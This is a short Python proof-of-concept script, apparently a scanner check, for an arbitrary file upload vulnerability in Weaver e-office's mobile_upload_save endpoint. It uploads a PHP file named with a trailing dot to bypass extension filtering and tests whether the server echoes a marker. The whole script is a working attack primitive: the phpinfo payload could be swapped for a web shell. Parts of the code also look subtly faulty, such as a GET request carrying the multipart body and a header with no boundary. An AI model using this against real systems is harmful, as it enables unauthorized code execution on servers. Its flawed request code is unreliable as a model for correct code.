import random
import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微e-office-mobile_upload_save存在任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'null',
        'Content-Type': 'application/octet-stream',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
        'Connection': 'close',
    }
    num = str(random.randint(1000, 10000))
    data = f'''
        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
        Content-Disposition: form-data; name="upload_quwan"; filename="{num}.php."
        Content-Type: image/jpeg
         
        <?php phpinfo();?>
        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
        Content-Disposition: form-data; name="file"; filename=""
        Content-Type: application/octet-stream
         
         
        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
    '''
    vurl = urllib.parse.urljoin(url, "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save")
    try:
        response = requests.get(vurl, headers=headers, data=data)
        if response.status_code == 200 and num in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult
